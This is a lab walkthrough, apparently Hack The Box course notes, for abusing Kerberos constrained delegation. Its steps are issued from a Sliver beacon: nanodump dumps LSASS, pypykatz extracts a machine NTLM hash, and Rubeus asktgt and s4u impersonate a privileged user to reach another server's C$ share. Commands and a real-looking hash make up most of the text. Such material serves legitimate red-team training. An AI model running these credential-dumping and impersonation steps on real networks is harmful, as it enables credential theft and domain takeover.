# 15.14 Kerberos Delegation Constrained

> Dump the delegating machine's hash with `nanodump`, then `Rubeus s4u` to S4U2Self+Proxy as any user to the allowed SPN.

## Overview

Constrained delegation allows a computer/service account to request TGS tickets on behalf of users, but only to specified services. Exploit with Rubeus s4u: asktgt for the delegating machine's hash, then s4u to impersonate a privileged user against the target service. nanodump extracts the machine account hash from LSASS.

## Steps

- Enumerate constrained delegation computers with SharpView `Get-NetComputer -TrustedToAuth`.
- From SYSTEM session on WEB01, use nanodump to extract LSASS and download the dump.
- Parse with pypykatz to extract WEB01$ NTLM hash.
- Request TGT for WEB01$ with Rubeus asktgt /user:web01$ /rc4:<hash>.
- Use Rubeus s4u to impersonate a privileged user against the delegated SPN; alternate service names bypass SPN restriction.
- Verify access by listing target's C$ after ticket operations.

## Commands

### Enumerate constrained delegation

```text
sliver (http-beacon) > sharpview Get-NetComputer -TrustedToAuth
```

### nanodump LSASS

```text
sliver (http-beacon) > nanodump 656 web01-lsass 1 PMDM
```

### Download dump

```text
sliver (http-beacon) > download web01-lsass
```

### Parse with pypykatz

```bash
python3 -m pypykatz lsa minidump web01-lsass
```

### Rubeus asktgt for machine account

```text
sliver (http-beacon) > inline-execute-assembly /home/htb-ac-1008/Rubeus.exe 'asktgt /user:web01$ /rc4:021b6a0d0e0ca246ec266bb72a481bc6 /nowrap'
```

### Rubeus s4u impersonation

```text
sliver (http-beacon) > inline-execute-assembly /home/htb-ac-1008/Rubeus.exe 's4u /impersonateuser:carrot /msdsspn:eventsystem/srv02.child.htb.local /user:web01$ /ticket:doIE8DCCBOygAwIBBaEDAgEWoo<SNIP>sZC5odGIubG9jYWw= /nowrap'
```

### Verify access

```text
sliver (http-beacon) > ls //srv02.child.htb.local/c$
```
